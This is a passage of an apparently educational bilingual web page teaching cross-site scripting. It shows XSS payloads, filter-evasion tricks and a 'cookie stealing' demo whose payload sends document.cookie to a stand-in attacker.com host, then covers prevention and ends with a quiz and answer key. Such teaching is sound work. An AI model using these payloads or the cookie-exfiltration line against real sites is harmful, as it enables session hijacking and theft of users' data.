&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;

// Unicode
javascript:alert('XSS')
becomes
javascript:alert('\u0058\u0053\u0053')
          </div>
        </div>
        
        <!-- Alternative Syntax -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--electric-blue); background: rgba(0, 170, 255, 0.05);">
          <h4 style="color: var(--electric-blue);">2. Alternative Syntax</h4>
          <p class="en">Use different syntax, event handlers, or attributes to execute scripts without using &lt;script&gt; tags.</p>
          <p class="hi" style="display:none;">&lt;script&gt; tags ka upyog kiye bina scripts execute karne ke liye alag syntax, event handlers, ya attributes ka upyog karein.</p>
          <div class="code-block">
// Event handlers
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>

// JavaScript pseudo-protocol
<a href="javascript:alert('XSS')">Click me</a>

// SVG elements
<svg onload=alert('XSS')>
          </div>
        </div>
        
        <!-- Context-Aware Bypasses -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-orange); background: rgba(255, 136, 0, 0.05);">
          <h4 style="color: var(--neon-orange);">3. Context-Aware Bypasses</h4>
          <p class="en">Craft payloads specific to the injection context (HTML, JavaScript, attribute, etc.).</p>
          <p class="hi" style="display:none;">Injection context (HTML, JavaScript, attribute, etc.) ke liye specific payloads banayein.</p>
          <div class="code-block">
// HTML context
<script>alert('XSS')</script>

// Attribute context
" onmouseover="alert('XSS')

// JavaScript context
'; alert('XSS'); //

// URL context
javascript:alert('XSS')
          </div>
        </div>
        
        <!-- Filter Evasion -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-pink); background: rgba(255, 0, 128, 0.05);">
          <h4 style="color: var(--neon-pink);">4. Filter Evasion</h4>
          <p class="en">Use techniques to bypass specific WAFs and filters by exploiting their weaknesses.</p>
          <p class="hi" style="display:none;">Unki kamjoriyon ka faida uthakar specific WAFs aur filters ko bypass karne ke liye tarikon ka upyog karein.</p>
          <div class="code-block">
// Case variation
<ScRiPt>alert('XSS')</ScRiPt>

// Extra characters
<scr<script>ipt>alert('XSS')</script>

// Null bytes
<script>alert('XSS')</script>

// Double encoding
%3Cscript%3Ealert('XSS')%3C/script%3E
          </div>
        </div>
      </div>

      <!-- Real-World Case Studies -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Real-World Case Studies</h3>
        <h3 class="hi" style="display:none;">Vastavik Duniya Ke Udaharan</h3>
        
        <div class="case-study" style="margin: 20px 0; padding: 20px; border: 1px solid var(--border); border-radius: 8px; background: rgba(0, 0, 0, 0.2);">
          <h4 style="color: var(--neon-green);">Case Study 1: Social Media Platform</h4>
          <p class="en"><strong>Scenario:</strong> A popular social media platform had a stored XSS vulnerability in its comment system.</p>
          <p class="hi" style="display:none;"><strong>Paristhiti:</strong> Ek lokpriya social media platform ki comment system mein stored XSS kamjori thi.</p>
          <p class="en"><strong>Exploitation:</strong> Attackers injected malicious scripts that stole user cookies and session tokens when users viewed infected posts.</p>
          <p class="hi" style="display:none;"><strong>Doharpan:</strong> Hamlawaron ne dushit scripts inject kiye jo upyogkartri cookies aur session tokens chura lete the jab upyogkartri infected posts dekhte the.</p>
          <p class="en"><strong>Impact:</strong> Thousands of accounts compromised, sensitive data exposed, and widespread account takeovers.</p>
          <p class="hi" style="display:none;"><strong>Prabhav:</strong> Hazaaron accounts compromise, sanvedansheel data expose, aur vyapak account takeovers.</p>
        </div>
        
        <div class="case-study" style="margin: 20px 0; padding: 20px; border: 1px solid var(--border); border-radius: 8px; background: rgba(0, 0, 0, 0.2);">
          <h4 style="color: var(--electric-blue);">Case Study 2: E-commerce Platform</h4>
          <p class="en"><strong>Scenario:</strong> An e-commerce site had a reflected XSS vulnerability in its search functionality.</p>
          <p class="hi" style="display:none;"><strong>Paristhiti:</strong> Ek e-commerce site ki search functionality mein reflected XSS kamjori thi.</p>
          <p class="en"><strong>Exploitation:</strong> Attackers crafted malicious URLs with XSS payloads and tricked users into clicking them through phishing campaigns.</p>
          <p class="hi" style="display:none;"><strong>Doharpan:</strong> Hamlawaron ne XSS payloads ke saath dushit URLs banaye aur phishing campaigns ke zariye upyogkartriyon ko unhe click karne ke liye bewakuf banaya.</p>
          <p class="en"><strong>Impact:</strong> Payment information theft, account compromises, and significant reputation damage to the company.</p>
          <p class="hi" style="display:none;"><strong>Prabhav:</strong> Bhugtan jankari theft, account compromises, aur company ko mahatvapurna pratishtha nuksan.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Try It Yourself – Cookie Stealing -->
  <section id="try-cookie">
    <div class="container">
      <h2 class="section-title en">Try It Yourself: Cookie Stealing</h2>
      <h2 class="section-title hi" style="display:none;">Khud Try Karein: Cookie Chori</h2>
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--neon-green); margin-bottom: 15px;" class="en">Steal Session Cookies with XSS</h3>
        <h3 style="color: var(--neon-green); margin-bottom: 15px; display:none;" class="hi">XSS Ke Saath Session Cookies Chori Karein</h3>
        <p class="en">Use XSS to exfiltrate session cookies to an attacker-controlled server.</p>
        <p class="hi" style="display:none;">Session cookies ko hamlawar-controlled server par exfiltrate karne ke liye XSS ka upyog karein.</p>
        <div class="demo-container">
          <div class="input-group">
            <label for="cookie-input" class="en">Cookie Stealing Payload:</label>
            <label for="cookie-input" class="hi" style="display:none;">Cookie Chori Payload:</label>
            <input type="text" id="cookie-input" value="&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;">
          </div>
          <button class="button" onclick="runCookieStealing()">Execute Payload</button>
          <div class="result-box" id="cookie-result">
// This would send the cookie to the attacker's server
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Prevention -->
  <section id="prevention">
    <div class="container">
      <h2 class="section-title en">How to Prevent XSS Vulnerabilities</h2>
      <h2 class="section-title hi" style="display:none;">XSS Kamjoriyon Ko Kaise Rokein</h2>
      
      <!-- Prevention Visualization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">XSS Prevention - Visualization</h3>
        <h3 class="hi" style="display:none;">XSS Bachav - Chitra</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 150px;">
            <div class="en">Malicious Input</div>
            <div class="hi" style="display:none;">Dushit Input</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 150px;">
            <div class="en">Defense Layers</div>
            <div class="hi" style="display:none;">Bachav Perton</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Validation, Encoding</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 150px;">
            <div class="en">Safe Output</div>
            <div class="hi" style="display:none;">Surakshit Output</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;</div>
          </div>
        </div>
      </div>

      <!-- Secure Coding Practices -->
      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Secure Coding Practices</h3>
        <h3 class="hi" style="display:none;">Surakshit Coding Abhyas</h3>
        
        <!-- Input Validation -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-green); background: rgba(0, 255, 136, 0.05);">
          <h4 style="color: var(--neon-green);">1. Input Validation</h4>
          <p class="en">Validate and sanitize all user inputs based on expected data types and patterns.</p>
          <p class="hi" style="display:none;">Expected data types aur patterns ke aadhar par sabhi upyogkartri inputs ki jaanch aur shodhan karein.</p>
          <div class="code-block">
// Example: Validate input contains only allowed characters
function isValidInput(input) {
  return /^[a-zA-Z0-9\s]+$/.test(input); // Only alphanumeric and spaces
}

// Example: Sanitize input by removing dangerous characters
function sanitizeInput(input) {
  return input.replace(/[<>"'&]/g, '');
}
          </div>
        </div>
        
        <!-- Output Encoding -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--electric-blue); background: rgba(0, 170, 255, 0.05);">
          <h4 style="color: var(--electric-blue);">2. Output Encoding</h4>
          <p class="en">Encode data before outputting it to the browser based on the context (HTML, JavaScript, etc.).</p>
          <p class="hi" style="display:none;">Browser mein output karne se pahle data ko context (HTML, JavaScript, etc.) ke aadhar par encode karein.</p>
          <div class="code-block">
// HTML encoding
function htmlEncode(str) {
  return str.replace(/[&<>"']/g, function(match) {
    return {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[match];
  });
}

// JavaScript encoding
function jsEncode(str) {
  return str.replace(/[\\'"<>]/g, '\\$&');
}
          </div>
        </div>
        
        <!-- Content Security Policy -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-orange); background: rgba(255, 136, 0, 0.05);">
          <h4 style="color: var(--neon-orange);">3. Content Security Policy (CSP)</h4>
          <p class="en">Implement a strong CSP to restrict sources of executable scripts and reduce XSS impact.</p>
          <p class="hi" style="display:none;">Executable scripts ke sroton ko pratibandhit karne aur XSS prabhav ko kam karne ke liye ek mazboot CSP lagu karein.</p>
          <div class="code-block">
// Example CSP header
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://trusted.cdn.com; 
  object-src 'none'; 
  style-src 'self' 'unsafe-inline';

// This prevents inline scripts and only allows
// scripts from the same origin or trusted CDN
          </div>
        </div>
        
        <!-- Secure Cookies -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-pink); background: rgba(255, 0, 128, 0.05);">
          <h4 style="color: var(--neon-pink);">4. Secure Cookie Attributes</h4>
          <p class="en">Use HttpOnly, Secure, and SameSite attributes to protect cookies from XSS attacks.</p>
          <p class="hi" style="display:none;">Cookies ko XSS attacks se bachane ke liye HttpOnly, Secure, aur SameSite attributes ka upyog karein.</p>
          <div class="code-block">
// Example: Set secure cookie flags
Set-Cookie: sessionId=abc123; 
  HttpOnly; 
  Secure; 
  SameSite=Strict; 
  Path=/;

// HttpOnly prevents JavaScript access
// Secure ensures cookie is only sent over HTTPS
// SameSite prevents CSRF attacks
          </div>
        </div>
      </div>

      <!-- Lab Environment Simulation -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Lab Environment Simulation</h3>
        <h3 class="hi" style="display:none;">Prayogshala Vatavaran Anukaran</h3>
        <p class="en">Set up a safe environment to test XSS prevention techniques without risking production systems.</p>
        <p class="hi" style="display:none;">Utpadan pranaliyon ko jokhim mein daale bina XSS bachav tarikon ka parikshan karne ke liye surakshit vatanavaran sthapit karein.</p>
        
        <div class="interactive-demo animate-on-scroll">
          <h4 style="color: var(--neon-green);">XSS Prevention Testing</h4>
          <div class="demo-container">
            <div class="input-group">
              <label for="test-input" class="en">Test Input:</label>
              <label for="test-input" class="hi" style="display:none;">Parikshan Input:</label>
              <input type="text" id="test-input" value="&lt;script&gt;alert('XSS')&lt;/script&gt;" placeholder="Enter XSS payload to test">
            </div>
            <button class="button" onclick="testXssProtection()" style="position: relative; z-index: 10;">Test Protection</button>
            <div class="result-box" id="protection-result">
// Results will appear here
            </div>
          </div>
        </div>
        
        <!-- Interactive Lab Exercise -->
        <div class="interactive-demo animate-on-scroll">
          <h4 style="color: var(--electric-blue);">Interactive Lab Exercise</h4>
          <p class="en">Try different XSS payloads to see how prevention mechanisms work:</p>
          <p class="hi" style="display:none;">XSS bachav yantrikon kaise kaam karte hain yeh dekhne ke liye alag-alag XSS payloads ka prayog karein:</p>
          
          <div class="demo-container">
            <div class="input-group">
              <label for="lab-input" class="en">XSS Payload:</label>
              <label for="lab-input" class="hi" style="display:none;">XSS Payload:</label>
              <input type="text" id="lab-input" placeholder="Enter any XSS payload to test">
            </div>
            <div style="display: flex; gap: 10px;">
              <button class="button" onclick="testLabPayload()" style="position: relative; z-index: 10;">Test Payload</button>
              <button class="button" style="background: var(--neon-orange); position: relative; z-index: 10;" onclick="clearLabResults()">Clear</button>
            </div>
            <div class="result-box" id="lab-result">
// Lab results will appear here
            </div>
            
            <!-- Predefined Test Cases -->
            <div style="margin-top: 20px;">
              <h5 class="en" style="color: var(--neon-green);">Quick Test Cases:</h5>
              <h5 class="hi" style="color: var(--neon-green); display:none;">Tvarit Parikshan Ke Antar:</h5>
              <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px;">
                <button class="button" style="background: var(--electric-blue); padding: 8px 12px; font-size: 0.9rem; position: relative; z-index: 10;" onclick="setTestPayload('&lt;script&gt;alert(1)&lt;/script&gt;')">Basic Script</button>
                <button class="button" style="background: var(--electric-blue); padding: 8px 12px; font-size: 0.9rem; position: relative; z-index: 10;" onclick="setTestPayload('&lt;img src=x onerror=alert(1)&gt;')">Image Error</button>
                <button class="button" style="background: var(--electric-blue); padding: 8px 12px; font-size: 0.9rem; position: relative; z-index: 10;" onclick="setTestPayload('javascript:alert(1)')">JavaScript URL</button>
                <button class="button" style="background: var(--electric-blue); padding: 8px 12px; font-size: 0.9rem; position: relative; z-index: 10;" onclick="setTestPayload('&lt;svg onload=alert(1)&gt;')">SVG Load</button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Quiz -->
  <section id="quiz">
    <div class="container">
      <h2 class="section-title en">Knowledge Check</h2>
      <h2 class="section-title hi" style="display:none;">Jaankari Check Karein</h2>
      <div class="quiz-container animate-on-scroll">
        <h3 style="color: var(--neon-green); text-align: center; margin-bottom: 20px;" class="en">Test Your Understanding</h3>
        <h3 style="color: var(--neon-green); text-align: center; margin-bottom: 20px; display:none;" class="hi">Apni Samajh Ko Test Karein</h3>
        <div id="quiz-questions">
          <!-- Questions will be injected here -->
        </div>
        <div class="score-display" id="score-display">Score: 0 / 10</div>
        <button class="button quiz-submit" onclick="submitQuiz()">Submit Quiz</button>
      </div>
    </div>
  </section>

  <!-- Footer -->
  <footer>
    <div class="container">
      <h3 class="en">By Ankush Rana | HTB Elite Hacker | Senior Security Engineer</h3>
      <h3 class="hi" style="display:none;">Ankush Rana Dwara | HTB Elite Hacker | Senior Security Engineer</h3>
      <p class="en">Breaking Systems. Building Defenses.</p>
      <p class="hi" style="display:none;">Systems todte hain. Defenses banate hain.</p>
      
      <div class="social-links">
        <a href="https://github.com/ankushrana6395" target="_blank" class="social-link github">
          <i class="fab fa-github"></i>
        </a>
        <a href="mailto:ankushrana6395@gmail.com" class="social-link email">
          <i class="fas fa-envelope"></i>
        </a>
        <a href="https://app.hackthebox.com/profile/117501" target="_blank" class="social-link htb">
          <i class="fas fa-cube"></i>
        </a>
      </div>
      
      <p style="margin-top: 30px;" class="en">&copy; 2025 Ankush Rana. All Rights Reserved.</p>
      <p style="margin-top: 30px; display:none;" class="hi">&copy; 2025 Ankush Rana. Sabhi Adhikar Sanchit Hai.</p>
    </div>
  </footer>

  <!-- Three.js -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
  <script>
    let isHinglish = false;
    
    // Card Interaction Functions (defined first to ensure they're available)
    function highlightCard(card) {
      card.classList.add('pop-out');
      showNotification('Hovering: ' + card.querySelector('h3').textContent);
    }
    function unhighlightCard(card) {
      if (!card.classList.contains('focused')) {
        card.classList.remove('pop-out');
      }
    }
    function focusCard(card) {
      document.querySelectorAll('.lecture-card').forEach(c => {
        c.classList.remove('focused');
        c.classList.remove('pop-out');
      });
      card.classList.add('focused');
      card.classList.add('pop-out');
      showNotification('Focused on: ' + card.querySelector('h3').textContent);
    }

    // Initialize Three.js
    const canvas = document.getElementById('three-canvas');
    const scene = new THREE.Scene();
    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
    const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));

    // Grid
    const gridHelper = new THREE.GridHelper(100, 100, 0x00ff88, 0x003322);
    gridHelper.position.z = -20;
    scene.add(gridHelper);

    // Floating Points
    const geometry = new THREE.BufferGeometry();
    const count = 500;
    const positions = new Float32Array(count * 3);
    for (let i = 0; i < count * 3; i++) {
      positions[i] = (Math.random() - 0.5) * 100;
    }
    geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
    const material = new THREE.PointsMaterial({ color: 0x00ff88, size: 0.5, transparent: true, opacity: 0.8 });
    const points = new THREE.Points(geometry, material);
    scene.add(points);

    // Add floating cubes
    const cubeGeometry = new THREE.BoxGeometry(2, 2, 2);
    const cubeMaterial = new THREE.MeshBasicMaterial({ 
      color: 0x00aaff, 
      wireframe: true,
      transparent: true,
      opacity: 0.5
    });
    const cubes = [];
    for (let i = 0; i < 10; i++) {
      const cube = new THREE.Mesh(cubeGeometry, cubeMaterial);
      cube.position.x = (Math.random() - 0.5) * 50;
      cube.position.y = (Math.random() - 0.5) * 50;
      cube.position.z = (Math.random() - 0.5) * 50;
      cube.rotation.x = Math.random() * Math.PI;
      cube.rotation.y = Math.random() * Math.PI;
      cubes.push({ mesh: cube, speed: Math.random() * 0.02 });
      scene.add(cube);
    }

    camera.position.z = 30;

    // Animation
    function animate() {
      requestAnimationFrame(animate);
      gridHelper.rotation.y += 0.005;
      points.rotation.y += 0.003;
      cubes.forEach(cube => {
        cube.mesh.rotation.x += cube.speed;
        cube.mesh.rotation.y += cube.speed;
      });
      renderer.render(scene, camera);
    }
    animate();

    // Resize
    window.addEventListener('resize', () => {
      camera.aspect = window.innerWidth / window.innerHeight;
      camera.updateProjectionMatrix();
      renderer.setSize(window.innerWidth, window.innerHeight);
    });

    // Keyword Modal
    const keywordModal = document.getElementById('keyword-modal');
    const modalTitle = document.getElementById('modal-title');
    const modalBody = document.getElementById('modal-body');
    const modalClose = document.getElementById('modal-close');

    // Add null checks for keyword modal elements
    if (!keywordModal) {
      console.warn('Keyword modal not found');
    }
    if (!modalTitle) {
      console.warn('Modal title not found');
    }
    if (!modalBody) {
      console.warn('Modal body not found');
    }
    if (!modalClose) {
      console.warn('Modal close not found');
    }
    document.querySelectorAll('.keyword').forEach(keyword => {
      keyword.addEventListener('click', function(e) {
        e.stopPropagation();
        modalTitle.textContent = this.getAttribute('data-title');
        modalBody.textContent = this.getAttribute('data-content');
        keywordModal.classList.add('active');
      });
    });
    modalClose.addEventListener('click', () => {
      keywordModal.classList.remove('active');
    });
    keywordModal.addEventListener('click', (e) => {
      if (e.target === keywordModal) {
        keywordModal.classList.remove('active');
      }
    });

    // Language Toggle
    const translatorBtn = document.getElementById('translator-btn');

    // Add null check
    if (!translatorBtn) {
      console.warn('Translator button not found');
    }
    function toggleLanguage() {
      isHinglish = !isHinglish;
      const enElements = document.querySelectorAll('.en');
      const hiElements = document.querySelectorAll('.hi');
      enElements.forEach(el => el.style.display = isHinglish ? 'none' : 'block');
      hiElements.forEach(el => el.style.display = isHinglish ? 'block' : 'none');
      translatorBtn.textContent = isHinglish ? '🌐 English On' : '🌐 Hinglish On';
      showNotification(isHinglish ? 'Hinglish mode activated!' : 'English mode activated!');
      renderQuiz();
    }

    // XSS Demo Functions
    function runXssExploit() {
      const payloadInput = document.getElementById('xss-input');
      const result = document.getElementById('xss-result');

      // Add null checks
      if (!payloadInput || !result) {
        console.warn('XSS demo elements not found');
        return;
      }

      const payload = payloadInput.value;

      // Basic XSS simulation
      if (payload.includes('<script>') || payload.includes('javascript:')) {
        result.innerHTML = isHinglish
          ? `<span style="color: #00ff88">✅ XSS Successful!</span>\nAlert would have been executed: ${payload.replace(/</g, '<').replace(/>/g, '>')}`
          : `<span style="color: #00ff88">✅ XSS Successful!</span>\nAlert would have been executed: ${payload.replace(/</g, '<').replace(/>/g, '>')}`;
        showNotification(isHinglish ? 'XSS: Payload safal!' : 'XSS: Payload successful!');
      } else {
        result.innerHTML = isHinglish
          ? `<span style="color: #ff8800">❌ XSS Failed.</span>\nPayload was sanitized: ${payload.replace(/</g, '<').replace(/>/g, '>')}`
          : `<span style="color: #ff8800">❌ XSS Failed.</span>\nPayload was sanitized: ${payload.replace(/</g, '<').replace(/>/g, '>')}`;
      }
    }

    function runStoredXss() {
      const payloadInput = document.getElementById('stored-xss-input');
      if (!payloadInput) {
        console.warn('Stored XSS input not found');
        return;
      }
      showNotification(isHinglish ? 'Comment post kiya gaya!' : 'Comment posted!');
      alert(isHinglish ? 'Stored XSS: Agar yeh real hota, toh yeh script database mein store ho jati aur har user ke page dekhne par execute hoti.' : 'Stored XSS: If this were real, this script would be stored in the database and executed when any user views this page.');
    }

    function runCookieStealing() {
      const payloadInput = document.getElementById('cookie-input');
      const result = document.getElementById('cookie-result');

      // Add null checks
      if (!payloadInput || !result) {
        console.warn('Cookie demo elements not found');
        return;
      }

      result.innerHTML = isHinglish
        ? `<span style="color: #00ff88">✅ Cookie Chori Successful!</span>\nSession cookie bheja gaya attacker ke server: sessionId=abc123xyz`
        : `<span style="color: #00ff88">✅ Cookie Stealing Successful!</span>\nSession cookie sent to attacker server: sessionId=abc123xyz`;
      showNotification(isHinglish ? 'Cookie chori safal!' : 'Cookie stealing successful!');
    }

    // Quiz Questions (10 Questions)
    const quizQuestions = [
      {
        question: {
          en: "What does XSS stand for?",
          hi: "XSS ka matlab kya hai?"
        },
        options: {
          en: [
            "Cross-Site Scripting",
            "Cross-Site Security",
            "Cross-Site Service",
            "Cross-Site System"
          ],
          hi: [
            "Cross-Site Scripting",
            "Cross-Site Security",
            "Cross-Site Service",
            "Cross-Site System"
          ]
        },
        correct: 0,
        explanation: {
          en: "XSS stands for Cross-Site Scripting, a vulnerability that allows attackers to inject malicious scripts.",
          hi: "XSS ka matlab hai Cross-Site Scripting, ek aisi kamjori jo hamlawaron ko dushit scripts inject karne ki anumati deti hai."
        }
      },
      {
        question: {
          en: "Which type of XSS is stored on the server?",
          hi: "Kaunsa XSS server par store hota hai?"
        },
        options: {
          en: [
            "Reflected XSS",
            "Stored XSS",
            "DOM-based XSS",
            "All of the above"
          ],
          hi: [
            "Reflected XSS",
            "Stored XSS",
            "DOM-based XSS",
            "Upar ke sabhi"
          ]
        },
        correct: 1,
        explanation: {
          en: "Stored XSS is stored on the server and executed when users access the affected page.",
          hi: "Stored XSS server par store hota hai aur upyogkartriyon ke affected page access karne par execute hota hai."
        }
      },
      {
        question: {
          en: "What is the main danger of XSS?",
          hi: "XSS ka mukhya khatra kya hai?"
        },
        options: {
          en: [
            "Server crashes",
            "Data theft and session hijacking",
            "Network slowdown",
            "Database corruption"
          ],
          hi: [
            "Server crashes",
            "Data theft aur session hijacking",
            "Network slowdown",
            "Database corruption"
          ]
        },
        correct: 1,
        explanation: {
          en: "XSS primarily enables data theft, session hijacking, and unauthorized actions on behalf of users.",
          hi: "XSS mukhya roop se data theft, session hijacking, aur upyogkartriyon ki taraf se anadhikrit kriyaon ko enable karta hai."
        }
      },
      {
        question: {
          en: "Which attribute helps prevent cookie theft via XSS?",
          hi: "Kaunsa attribute XSS ke zariye cookie theft rokne mein madad karta hai?"
        },
        options: {
          en: [
            "Secure",
            "HttpOnly",
            "SameSite",
            "All of the above"
          ],
          hi: [
            "Secure",
            "HttpOnly",
            "SameSite",
            "Upar ke sabhi"
          ]
        },
        correct: 3,
        explanation: {
          en: "HttpOnly prevents JavaScript access to cookies, Secure ensures HTTPS-only transmission, and SameSite prevents CSRF attacks.",
          hi: "HttpOnly cookies tak JavaScript access ko rokta hai, Secure HTTPS-only transmission ensure karta hai, aur SameSite CSRF attacks ko rokta hai."
        }
      },
      {
        question: {
          en: "What does CSP stand for in XSS prevention?",
          hi: "XSS prevention mein CSP ka matlab kya hai?"
        },
        options: {
          en: [
            "Content Security Policy",
            "Cross-Site Protection",
            "Cookie Security Protocol",
            "Content Sanitization Process"
          ],
          hi: [
            "Content Security Policy",
            "Cross-Site Protection",
            "Cookie Security Protocol",
            "Content Sanitization Process"
          ]
        },
        correct: 0,
        explanation: {
          en: "CSP stands for Content Security Policy, a security standard that helps prevent XSS attacks.",
          hi: "CSP ka matlab hai Content Security Policy, ek suraksha standard jo XSS attacks ko rokne mein madad karta hai."
        }
      },
      {
        question: {
          en: "Which event handler is commonly used in XSS payloads?",
          hi: "Kaunsa event handler XSS payloads mein aam taur par upyog hota hai?"
        },
        options: {
          en: [
            "onclick",
            "onerror",
            "onload",
            "All of the above"
          ],
          hi: [
            "onclick",
            "onerror",
            "onload",
            "Upar ke sabhi"
          ]
        },
        correct: 3,
        explanation: {
          en: "XSS payloads often use various event handlers like onerror, onload, and onclick to execute malicious code.",
          hi: "XSS payloads aksar onerror, onload, aur onclick jaise vibhinn event handlers ka upyog dushit code execute karne ke liye karte hain."
        }
      },
      {
        question: {
          en: "What is the purpose of input validation in XSS prevention?",
          hi: "XSS prevention mein input validation ka uddeshya kya hai?"
        },
        options: {
          en: [
            "To make applications faster",
            "To ensure only expected data is accepted",
            "To improve user experience",
            "To reduce server load"
          ],
          hi: [
            "Applications ko tez banane ke liye",
            "Yeh ensure karne ke liye ki keval expected data svikar kiya jaye",
            "User experience sudharne ke liye",
            "Server load kam karne ke liye"
          ]
        },
        correct: 1,
        explanation: {
          en: "Input validation ensures only expected and safe data is accepted, reducing the risk of XSS payloads.",
          hi: "Input validation ensure karta hai ki keval expected aur surakshit data svikar kiya jata hai, jisse XSS payloads ka khatra kam hota hai."
        }
      },
      {
        question: {
          en: "Which encoding method is used for HTML context output?",
          hi: "HTML context output ke liye kaunsa encoding method upyog hota hai?"
        },
        options: {
          en: [
            "Base64 encoding",
            "HTML entity encoding",
            "URL encoding",
            "Hex encoding"
          ],
          hi: [
            "Base64 encoding",
            "HTML entity encoding",
            "URL encoding",
            "Hex encoding"
          ]
        },
        correct: 1,
        explanation: {
          en: "HTML entity encoding converts dangerous characters like < and > to &lt; and &gt; to prevent XSS.",
          hi: "HTML entity encoding khatarnaak characters jaise < aur > ko &lt; aur &gt; mein badalta hai XSS rokne ke liye."
        }
      },
      {
        question: {
          en: "What does the HttpOnly cookie attribute do?",
          hi: "HttpOnly cookie attribute kya karta hai?"
        },
        options: {
          en: [
            "Prevents cookies from being sent over HTTP",
            "Makes cookies accessible only via HTTP",
            "Prevents JavaScript from accessing cookies",
            "Encrypts cookie values"
          ],
          hi: [
            "Cookies ko HTTP par bhejne se rokta hai",
            "Cookies ko keval HTTP ke zariye accessible banata hai",
            "JavaScript ko cookies tak pahunchne se rokta hai",
            "Cookie values ko encrypt karta hai"
          ]
        },
        correct: 2,
        explanation: {
          en: "The HttpOnly attribute prevents JavaScript from accessing cookies, mitigating XSS-based cookie theft.",
          hi: "HttpOnly attribute JavaScript ko cookies tak pahunchne se rokta hai, XSS-based cookie theft ko kam karta hai."
        }
      },
      {
        question: {
          en: "Which technique is NOT used to bypass XSS filters?",
          hi: "Kaunsa technique XSS filters ko bypass karne ke liye upyog nahi hota?"
        },
        options: {
          en: [
            "Character encoding",
            "Input validation",
            "Case variation",
            "Using alternative syntax"
          ],
          hi: [
            "Character encoding",
            "Input validation",
            "Case variation",
            "Alternative syntax ka upyog"
          ]
        },
        correct: 1,
        explanation: {
          en: "Input validation is a defense mechanism, not a bypass technique. Attackers use encoding, case variation, and alternative syntax to bypass filters.",
          hi: "Input validation ek bachav yantra hai, bypass technique nahi. Hamlawar filters ko bypass karne ke liye encoding, case variation, aur alternative syntax ka upyog karte hain."
        }
      }
    ];

    // Render Quiz
    function renderQuiz() {
      const quizContainer = document.getElementById('quiz-questions');
      if (!quizContainer) {
        console.warn('Quiz container not found');
        return;
      }
      quizContainer.innerHTML = '';
      quizQuestions.forEach((q, index) => {
        const questionDiv = document.createElement('div');
        questionDiv.className = 'quiz-question';
        const qText = isHinglish ? q.question.hi : q.question.en;
        const opts = isHinglish ? q.options.hi : q.options.en;
        questionDiv.innerHTML = `
          <h4>Q${index + 1}: ${qText}</h4>
          <div class="options" id="options-${index}">
            ${opts.map((opt, i) => `
              <div class="option" onclick="selectOption(${index}, ${i})">${opt}</div>
            `).join('')}
          </div>
        `;
        quizContainer.appendChild(questionDiv);
      });
    }

    // Track selected answers
    const selectedAnswers = new Array(quizQuestions.length).fill(-1);

    // Select Option
    window.selectOption = function(questionIndex, optionIndex) {
      document.querySelectorAll(`#options-${questionIndex} .option`).forEach(opt => {
        opt.classList.remove('selected');
      });
      document.querySelectorAll(`#options-${questionIndex} .option`)[optionIndex].classList.add('selected');
      selectedAnswers[questionIndex] = optionIndex;
    };

    // Submit Quiz
    window.submitQuiz = function() {
      let score = 0;
      const feedback = document.getElementById('feedback');
      const scoreDisplay = document.getElementById('score-display');

      // Add null checks
      if (!scoreDisplay) {
        console.warn('Score display element not found');
        return;
      }
      if (!feedback) {
        console.warn('Feedback element not found');
        return;
      }

      feedback.innerHTML = '';
      feedback.style.display = 'block';

      quizQuestions.forEach((q, index) => {
        const options = document.querySelectorAll(`#options-${index} .option`);
        const explanation = isHinglish ? q.explanation.hi : q.explanation.en;

        if (selectedAnswers[index] === q.correct) {
          score++;
          if (options && options[q.correct]) options[q.correct].classList.add('correct');
        } else {
          if (options && options[q.correct]) options[q.correct].classList.add('correct');
          if (selectedAnswers[index] !== -1 && selectedAnswers[index] !== q.correct && options && options[selectedAnswers[index]]) {
            options[selectedAnswers[index]].classList.add('incorrect');
          }
        }

        feedback.innerHTML += `<strong>Q${index + 1}:</strong> ${explanation}<br><br>`;
      });

      scoreDisplay.textContent = `Score: ${score} / ${quizQuestions.length}`;
